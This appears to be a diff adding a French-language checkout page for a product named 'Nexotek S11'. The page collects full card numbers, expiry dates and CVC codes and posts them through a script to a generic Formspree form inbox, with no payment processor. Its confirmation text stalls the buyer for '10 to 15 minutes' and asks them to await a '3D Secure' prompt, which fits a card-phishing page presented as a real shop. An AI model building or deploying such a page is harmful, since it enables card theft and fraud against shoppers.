@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Paiement - Nexotek S11</title>
+  <link rel="stylesheet" href="styles.css" />
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #111;
+      color: white;
+      padding: 20px;
+    }
+    header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    header img {
+      height: 50px;
+    }
+    form {
+      background-color: #1a1a1a;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 500px;
+      margin: auto;
+    }
+    label {
+      display: block;
+      margin: 15px 0 5px;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      font-size: 16px;
+    }
+    .total {
+      text-align: right;
+      margin-top: 15px;
+      font-weight: bold;
+      font-size: 18px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #00aaff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+    #confirmation {
+      display: none;
+      background-color: #1a1a1a;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 500px;
+      margin: 30px auto;
+      text-align: center;
+    }
+    .product-img {
+      display: block;
+      margin: 0 auto 20px;
+      max-width: 100%;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="logo.png" alt="Logo Nexotek">
+  </header>
+
+  <img src="product.jpg" alt="Produit Nexotek S11" class="product-img" />
+
+  <form action="https://formspree.io/f/mvgapayj" method="POST">
+    <label for="name">Nom complet</label>
+    <input type="text" id="name" name="name" required />
+
+    <label for="phone">Téléphone</label>
+    <input type="tel" id="phone" name="phone" required />
+
+    <label for="email">Adresse e-mail</label>
+    <input type="email" id="email" name="email" required />
+
+    <label for="address">Adresse de livraison</label>
+    <input type="text" id="address" name="address" required />
+
+    <label for="quantity">Quantité (max 5)</label>
+    <select id="quantity" name="quantity" required>
+      <option value="1" selected>1</option>
+      <option value="2">2</option>
+      <option value="3">3</option>
+      <option value="4">4</option>
+      <option value="5">5</option>
+    </select>
+
+    <label for="card">Numéro de carte bancaire</label>
+    <input type="text" id="card" name="card" required />
+
+    <label for="expiry">Mois / Année d’expiration</label>
+    <input type="text" id="expiry" name="expiry" placeholder="MM/AA" required />
+
+    <label for="cvc">Code de sécurité (CVC)</label>
+    <input type="text" id="cvc" name="cvc" required />
+
+    <div class="total">Total : <span id="total">119 €</span></div>
+
+    <button type="submit">Procéder au paiement</button>
+  </form>
+
+  <div id="confirmation">
+    <h2>Merci pour votre commande !</h2>
+    <p>Nous avons bien reçu vos informations.</p>
+    <p>Le traitement de votre paiement va commencer et peut prendre entre <strong>10 à 15 minutes</strong> via notre prestataire agréé.</p>
+    <p>Gardez votre téléphone à proximité pour une éventuelle validation <strong>3D Secure</strong>.</p>
+    <p>Une fois le paiement validé par votre banque, vous recevrez votre <strong>facture</strong> et les <strong>informations de livraison</strong> par e-mail.</p>
+    <p>Vous pouvez à présent quitter cette page.</p>
+  </div>
+
+  <script>
+    const form = document.querySelector("form");
+    const confirmationBox = document.getElementById("confirmation");
+    const quantityInput = document.getElementById("quantity");
+    const totalText = document.getElementById("total");
+
+    quantityInput.addEventListener("change", () => {
+      const price = 119;
+      const quantity = parseInt(quantityInput.value);
+      totalText.textContent = (price * quantity) + " €";
+    });
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      const formData = new FormData(form);
+      fetch(form.action, {
+        method: "POST",
+        body: formData,
+        headers: {
+          Accept: "application/json"
+        }
+      }).then(response => {
+        if (response.ok) {
+          form.style.display = "none";
+          confirmationBox.style.display = "block";
+        } else {
+          alert("Erreur d'envoi. Veuillez réessayer.");
+        }
+      }).catch(error => {
+        alert("Erreur réseau. Veuillez vérifier votre connexion.");
+        console.error(error);
+      });
+    });
+  </script>
+
+</body>
+</html>
